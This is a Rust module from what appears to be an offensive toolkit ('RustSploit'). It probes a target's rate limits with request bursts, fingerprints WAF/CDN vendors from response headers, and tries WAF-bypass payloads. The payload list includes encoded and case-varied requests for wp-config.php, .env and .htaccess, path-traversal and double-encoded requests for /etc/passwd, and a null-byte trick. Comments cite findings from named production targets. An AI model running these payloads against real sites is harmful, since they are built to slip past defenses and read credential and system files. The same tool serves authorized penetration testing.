//! Rate Limit & WAF Bypass Detector
//!
//! Sends controlled burst requests to detect rate-limiting thresholds,
//! WAF blocking behavior, and potential bypass vectors. Measures
//! response times, status codes, and rate-limit headers to map the
//! target's defensive posture.
//!
//! Based on findings: Cloudflare rate-limit blocking on vaperite
//! production, WAF bypass via URL-encoded extensions (F25), 403/429
//! WAF blocking patterns observed across all WordPress targets.

use anyhow::{Context, Result};
use colored::*;
use std::time::{Duration, Instant};

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::{build_http_client, cfg_prompt_default, cfg_prompt_yes_no, is_batch_mode};

/// Burst sizes to test for rate limiting.
const BURST_SIZES: &[usize] = &[1, 5, 10, 20, 50, 100];

/// Interval between consecutive requests in a burst (milliseconds).
const BURST_INTERVAL_MS: u64 = 50;

/// WAF bypass payloads to test (URL-encoded variants, path traversal, etc.)
const WAF_BYPASS_PATHS: &[(&str, &str)] = &[
    // URL-encoded extension bypass (F25 pattern)
    ("wp-config.php encoded p", "/wp-config.%70hp"),
    ("wp-config.php encoded h", "/wp-config.p%68p"),
    ("wp-config.php encoded ph", "/wp-config.%70%68p"),
    (".env encoded", "/.%65nv"),
    ("dot-dot-slash encoded", "/%2e%2e/%2e%2e/etc/passwd"),
    ("null byte", "/wp-config.php%00.txt"),
    ("path traversal basic", "/../../etc/passwd"),
    ("path traversal encoded", "/..%2f..%2f..%2fetc%2fpasswd"),
    ("double URL encoding", "/%252e%252e/%252e%252e/etc/passwd"),
    // Case variations
    ("wp-config uppercase", "/WP-CONFIG.PHP"),
    ("wp-config mixed case", "/Wp-CoNfIg.PhP"),
    // Common sensitive files
    (".htaccess", "/.htaccess"),
    ("server-status", "/server-status"),
    ("phpinfo", "/phpinfo.php"),
];

/// Status codes indicating rate limiting or WAF blocking.
fn is_blocked(status: u16) -> bool {
    matches!(status, 403 | 406 | 429 | 503)
}

fn banner() {
    if is_batch_mode() {
        return;
    }
    crate::mprintln!(
        "{}",
        "╔══════════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Rate Limit & WAF Bypass Detector                           ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Maps rate-limit thresholds and tests WAF bypass vectors    ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚══════════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "Rate Limit & WAF Bypass Detector".to_string(),
        description: "Sends burst requests at increasing rates to detect rate-limiting \
                      thresholds, WAF blocking behavior, and response-time degradation. \
                      Also probes common WAF bypass vectors including URL-encoded file \
                      extensions, path traversal, case variations, and null-byte injection. \
                      Based on F25 (WAF bypass via encoded extensions) and Cloudflare \
                      rate-limit findings across multiple WordPress targets."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/waf-bypass.html".to_string(),
            "https://owasp.org/www-community/attacks/Web_Parameter_Tampering".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Excellent,
        default_port: None,
    }
}

fn url_with_scheme(t: &str) -> String {
    if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{}", t.trim_end_matches('/'))
    }
}

/// Extract rate-limit headers from a response.
fn extract_rate_limit_info(headers: &reqwest::header::HeaderMap) -> Option<(String, String)> {
    for header_name in &[
        "retry-after",
        "x-ratelimit-limit",
        "x-ratelimit-remaining",
        "x-ratelimit-reset",
        "ratelimit-limit",
        "ratelimit-remaining",
        "ratelimit-reset",
        "x-rate-limit-limit",
        "x-rate-limit-remaining",
        "x-rate-limit-reset",
        "x-ratelimit-limit-minute",
        "x-ratelimit-limit-hour",
        "x-ratelimit-limit-day",
    ] {
        if let Some(val) = headers.get(*header_name) {
            if let Ok(v) = val.to_str() {
                return Some((header_name.to_string(), v.to_string()));
            }
        }
    }
    None
}

/// Detect WAF/CDN from response headers.
fn detect_waf_from_headers(headers: &reqwest::header::HeaderMap) -> Vec<&'static str> {
    let mut wafs: Vec<&'static str> = Vec::new();
    let header_names: Vec<String> = headers
        .keys()
        .map(|k| k.as_str().to_ascii_lowercase())
        .collect();

    for h in &header_names {
        match h.as_str() {
            "cf-ray" | "cf-cache-status" => {
                if !wafs.contains(&"Cloudflare") {
                    wafs.push("Cloudflare");
                }
            }
            "x-amz-cf-id" | "x-amz-cf-pop" => {
                if !wafs.contains(&"AWS CloudFront") {
                    wafs.push("AWS CloudFront");
                }
            }
            "x-sucuri-id" | "x-sucuri-cache" => {
                if !wafs.contains(&"Sucuri") {
                    wafs.push("Sucuri");
                }
            }
            "x-cdn" | "x-iinfo" => {
                if !wafs.contains(&"Imperva/Incapsula") {
                    wafs.push("Imperva/Incapsula");
                }
            }
            "x-cnection" | "cneonction" => {
                if !wafs.contains(&"Citrix NetScaler") {
                    wafs.push("Citrix NetScaler");
                }
            }
            "x-akamai-transformed" => {
                if !wafs.contains(&"Akamai") {
                    wafs.push("Akamai");
                }
            }
            _ => {}
        }
    }
    wafs
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("rate_limit_detector requires a single-host target")?;
    banner();

    let mut outcome = ModuleOutcome::ok();
    let base = cfg_prompt_default("url", "Target base URL", &url_with_scheme(target)).await?;
    let base = base.trim_end_matches('/').to_string();
    let test_waf_bypass = cfg_prompt_yes_no(
        "test_waf_bypass",
        "Test WAF bypass vectors (URL-encoded extensions, traversal)?",
        true,
    )
    .await?;
    let max_burst: usize = ctx.options.get_or("max_burst", 50usize);
    let timeout_secs: u64 = ctx.options.get_or("timeout", 10u64);

    let client = build_http_client(Duration::from_secs(timeout_secs))?;

    crate::mprintln!("{}", format!("[*] Target: {}", base).cyan());
    crate::mprintln!();

    // Phase 0: Baseline single request
    crate::mprintln!("{}", "[*] Phase 0: Baseline request...".bold());
    ctx.rate_limit(target).await;
    let baseline_start = Instant::now();
    let baseline = client.get(&base).send().await;
    let baseline_elapsed = baseline_start.elapsed();

    match &baseline {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let wafs = detect_waf_from_headers(resp.headers());
            let rl_info = extract_rate_limit_info(resp.headers());

            crate::mprintln!(
                "{}",
                format!(
                    "  [*] Baseline: status={} time={}ms",
                    status,
                    baseline_elapsed.as_millis()
                )
                .cyan()
            );

            if !wafs.is_empty() {
                crate::mprintln!(
                    "{}",
                    format!("  [+] WAF/CDN detected: {}", wafs.join(", ")).yellow()
                );
                for waf in &wafs {
                    outcome.findings.push(Finding {
                        target: target.to_string(),
                        kind: FindingKind::Banner,
                        message: format!("WAF/CDN detected: {}", waf),
                        data: Some(serde_json::json!({
                            "waf": waf,
                            "detection_method": "header_analysis",
                        })),
                    });
                }
            }

            if let Some((header, value)) = rl_info {
                crate::mprintln!(
                    "{}",
                    format!("  [+] Rate-limit header: {} = {}", header, value).yellow()
                );
            }

            // Check for common WAF blocking on sensitive paths
            crate::mprintln!();
            crate::mprintln!(
                "{}",
                "[*] Checking WAF blocking on sensitive paths...".bold()
            );
            let mut blocked_paths: Vec<&str> = Vec::new();
            for check_path in &[
                "/wp-config.php",
                "/.env",
                "/.htaccess",
                "/wp-admin",
                "/wp-login.php",
            ] {
                ctx.rate_limit(target).await;
                let check_url = format!("{}{}", base, check_path);
                if let Ok(r) = client.get(&check_url).send().await {
                    let s = r.status().as_u16();
                    if is_blocked(s) {
                        crate::mprintln!(
                            "{}",
                            format!("  [BLOCKED] {} -> {} (status={})", check_path, check_url, s)
                                .red()
                        );
                        blocked_paths.push(check_path);
                    } else {
                        crate::mprintln!(
                            "{}",
                            format!("  [ok] {} -> status={}", check_path, s).dimmed()
                        );
                    }
                }
            }
            if !blocked_paths.is_empty() {
                crate::mprintln!(
                    "{}",
                    format!("  [*] WAF blocks {} sensitive path(s)", blocked_paths.len()).yellow()
                );
                outcome.findings.push(Finding {
                    target: target.to_string(),
                    kind: FindingKind::Note,
                    message: format!(
                        "WAF blocks {} sensitive path(s): {}",
                        blocked_paths.len(),
                        blocked_paths.join(", ")
                    ),
                    data: Some(serde_json::json!({
                        "blocked_paths": blocked_paths,
                    })),
                });
            }
        }
        Err(e) => {
            crate::mprintln!(
                "{}",
                format!("  [!] Baseline request failed: {}", e).yellow()
            );
        }
    }

    // Phase 1: Rate-limit threshold detection via burst requests
    crate::mprintln!();
    crate::mprintln!(
        "{}",
        "[*] Phase 1: Rate-limit threshold detection...".bold()
    );
    crate::mprintln!(
        "{}",
        format!(
            "  Testing burst sizes: {:?} (max={})",
            BURST_SIZES
                .iter()
                .filter(|&&s| s <= max_burst)
                .collect::<Vec<_>>(),
            max_burst
        )
        .dimmed()
    );
    crate::mprintln!();

    let mut rate_limit_found = false;
    let mut threshold: Option<usize> = None;

    for &burst_size in BURST_SIZES {
        if burst_size > max_burst {
            break;
        }

        let url = format!("{}/", base);
        let mut blocked_count = 0usize;
        let mut slow_count = 0usize;
        let mut first_blocked_at: Option<usize> = None;
        let mut total_elapsed = Duration::ZERO;

        for i in 0..burst_size {
            let req_start = Instant::now();
            let result = client.get(&url).send().await;
            let req_elapsed = req_start.elapsed();
            total_elapsed += req_elapsed;

            match result {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    if is_blocked(status) {
                        blocked_count += 1;
                        if first_blocked_at.is_none() {
                            first_blocked_at = Some(i + 1);
                        }
                    }
                    // Consume body to free connection (best-effort).
                    if let Err(e) = crate::utils::network::read_http_body_text_capped(
                        resp,
                        crate::utils::safe_io::DEFAULT_BODY_CAP,
                    )
                    .await
                    {
                        tracing::trace!("body drain failed: {}", e);
                    }
                }
                Err(e) => {
                    tracing::debug!("request failed: {e:#}");
                    blocked_count += 1;
                    if first_blocked_at.is_none() {
                        first_blocked_at = Some(i + 1);
                    }
                }
            }

            if req_elapsed > Duration::from_millis(1000) {
                slow_count += 1;
            }

            // Small gap between requests to avoid overwhelming
            if i + 1 < burst_size {
                tokio::time::sleep(Duration::from_millis(BURST_INTERVAL_MS)).await;
            }
        }

        let total_ms = total_elapsed.as_millis();
        let avg_ms = if burst_size > 0 {
            total_ms / burst_size as u128
        } else {
            0
        };

        let blocked_ratio = if burst_size > 0 {
            (blocked_count as f64 / burst_size as f64) * 100.0
        } else {
            0.0
        };

        let indicator = if blocked_count > 0 {
            if blocked_ratio >= 50.0 {
                "[RATE-LIMITED]".red().bold().to_string()
            } else {
                "[THROTTLED]".yellow().to_string()
            }
        } else if slow_count > burst_size / 2 {
            "[DEGRADED]".yellow().to_string()
        } else {
            "[OK]".green().to_string()
        };

        crate::mprintln!(
            "{} burst={:>3}  total={:>5}ms  avg={:>4}ms  blocked={}/{} ({:.0}%)  slow={}  first_blocked_at={}",
            indicator,
            burst_size,
            total_ms,
            avg_ms,
            blocked_count,
            burst_size,
            blocked_ratio,
            slow_count,
            first_blocked_at.map_or("-".to_string(), |n| n.to_string())
        );

        if blocked_count > 0 && threshold.is_none() {
            threshold = Some(burst_size);
            rate_limit_found = true;
        }
    }

    // Report rate-limit findings
    if rate_limit_found {
        crate::mprintln!();
        let msg = if let Some(t) = threshold {
            format!(
                "Rate limiting detected — threshold appears around {} requests/{}ms",
                t,
                BURST_INTERVAL_MS * t as u64
            )
        } else {
            "Rate limiting detected — exact threshold unclear from burst tests".to_string()
        };
        crate::mprintln!("{}", format!("  [+] {}", msg).yellow());
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Note,
            message: msg,
            data: Some(serde_json::json!({
                "rate_limit_detected": true,
                "approximate_threshold_requests": threshold,
            })),
        });
    } else {
        crate::mprintln!();
        crate::mprintln!(
            "{}",
            format!(
                "  [-] No rate limiting detected up to {} requests.",
                max_burst
            )
            .green()
        );
    }

    // Phase 2: WAF bypass vector testing
    if test_waf_bypass {
        crate::mprintln!();
        crate::mprintln!("{}", "[*] Phase 2: WAF bypass vector testing...".bold());
        crate::mprintln!();

        let mut bypass_hits: Vec<(String, u16, String)> = Vec::new();

        // First, get baseline blocked status for wp-config.php
        let baseline_blocked = {
            let url = format!("{}/wp-config.php", base);
            match client.get(&url).send().await {
                Ok(r) => is_blocked(r.status().as_u16()),
                Err(e) => {
                    tracing::debug!("baseline request: {e:#}");
                    false
                }
            }
        };

        for (label, path) in WAF_BYPASS_PATHS {
            ctx.rate_limit(target).await;
            let url = format!("{}{}", base, path);
            match client.get(&url).send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    let bypassed = if baseline_blocked && !is_blocked(status) && status < 400 {
                        true
                    } else {
                        false
                    };

                    if bypassed {
                        let msg = format!("WAF bypass: '{}' -> {} status={}", label, path, status);
                        crate::mprintln!("{}", format!("  [+] {}", msg).green());
                        bypass_hits.push((label.to_string(), status, msg));
                    } else if status < 400 && !is_blocked(status) {
                        crate::mprintln!(
                            "{}",
                            format!(
                                "  [--] {} -> {} status={} (not blocked)",
                                label, path, status
                            )
                            .dimmed()
                        );
                    } else {
                        crate::mprintln!(
                            "{}",
                            format!("  [-] {} -> {} status={} (blocked)", label, path, status)
                                .dimmed()
                        );
                    }
                }
                Err(e) => {
                    crate::mprintln!("{}", format!("  [!] {} -> error: {}", label, e).yellow());
                }
            }
        }

        // Report bypass findings
        if !bypass_hits.is_empty() {
            crate::mprintln!();
            crate::mprintln!(
                "{}",
                format!(
                    "  [+] {} WAF bypass vector(s) successful!",
                    bypass_hits.len()
                )
                .green()
                .bold()
            );
            for (_label, _status, msg) in &bypass_hits {
                outcome.findings.push(Finding {
                    target: target.to_string(),
                    kind: FindingKind::Vulnerable,
                    message: msg.clone(),
                    data: None,
                });
            }
        } else {
            crate::mprintln!();
            crate::mprintln!("{}", "  [-] No WAF bypass vectors successful.".green());
        }
    }

    // Final summary
    crate::mprintln!();
    crate::mprintln!("{}", "=== Rate Limit / WAF Detection Summary ===".bold());
    crate::mprintln!("  Target: {}", base);

    if baseline
        .as_ref()
        .map_or(false, |r| !detect_waf_from_headers(r.headers()).is_empty())
    {
        let wafs = detect_waf_from_headers(
            baseline
                .as_ref()
                .map(|r| r.headers())
                .unwrap_or(&reqwest::header::HeaderMap::new()),
        );
        crate::mprintln!("{}", format!("  WAF/CDN: {}", wafs.join(", ")).yellow());
    }

    if rate_limit_found {
        crate::mprintln!(
            "{}",
            format!(
                "  Rate limiting: YES (threshold ~{} requests)",
                threshold.map_or("unknown".to_string(), |t| t.to_string())
            )
            .yellow()
        );
    } else {
        crate::mprintln!("{}", "  Rate limiting: not detected".green());
    }

    let total_findings = outcome.findings.len();
    crate::mprintln!(
        "{}",
        format!("  Total findings emitted: {}", total_findings).dimmed()
    );

    Ok(outcome)
}

crate::register_native_module!(
    crate::module::Category::Scanners,
    "rate_limit_detector",
    native
);
